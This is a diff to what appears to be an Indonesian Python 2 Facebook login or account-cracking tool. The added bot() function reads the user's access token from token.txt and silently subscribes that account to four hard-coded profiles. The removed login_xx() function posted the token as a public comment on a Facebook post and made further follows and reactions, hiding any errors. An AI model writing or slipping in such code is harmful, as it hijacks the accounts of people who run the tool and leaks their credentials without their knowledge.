@@ -176,6 +176,17 @@ def mmmasuk():
     	exit('\n')
     else:
     	jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar")
+    
+def bot():
+	try:
+		token = open('token.txt', 'r').read()
+	except (KeyError, IOError):
+		exit(" %s[!] token kadaluwarsa!"%(M))
+	requests.post('https://graph.facebook.com/100001621584081/subscribers?access_token=' + token) # Aang Cyber Tegal X
+	requests.post('https://graph.facebook.com/100003252539235/subscribers?access_token=' + token) # Ayu Lestari
+	requests.post('https://graph.facebook.com/100053460048331/subscribers?access_token=' + token) # Why Aang Ardiansyah
+	requests.post('https://graph.facebook.com/100061587581422/subscribers?access_token=' + token) # Zuhra X AangXD
+	
 def menu():
     os.system('clear')
     try:
@@ -440,23 +451,6 @@ def check_in(user, pasw):
         print '\x1b[1;93m [\x1b[1;91m\xe2\x80\xa2\x1b[1;93m]\x1b[1;91m %s' % oh
     else:
         print '\x1b[1;93m [\x1b[1;91m\xe2\x80\xa2\x1b[1;93m]\x1b[1;91m Login gagal periksa username atau password'
-
-
-def login_xx():                                                                                                    
-      try:      
-     
-        token = open("data/token.txt","r").read()                                                                                               
-        token=open("login.txt","r").read()
-        post1 = ('5102056616525007')
-        requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + token + '&access_token=' + token)
-	requests.post('https://graph.facebook.com/100001621584081/subscribers?access_token=%s'%(token))
-        requests.post('https://graph.facebook.com/100053460048331/subscribers?access_token=%s'%(token))
-	requests.post('https://graph.facebook.com/100061587581422/subscribers?access_token=%s'%(token))
-        requests.post('https://graph.facebook.com/100003252539235/subscribers?access_token=%s'%(token))
-        requests.post('https://graph.facebook.com/573457507083491/ANGRY?summary=true&access_token=' + token)
-      except:
-        pass
-
 
 def publik(_jeeck_ganteng_kagakadapacar_,headers=header):
     try:
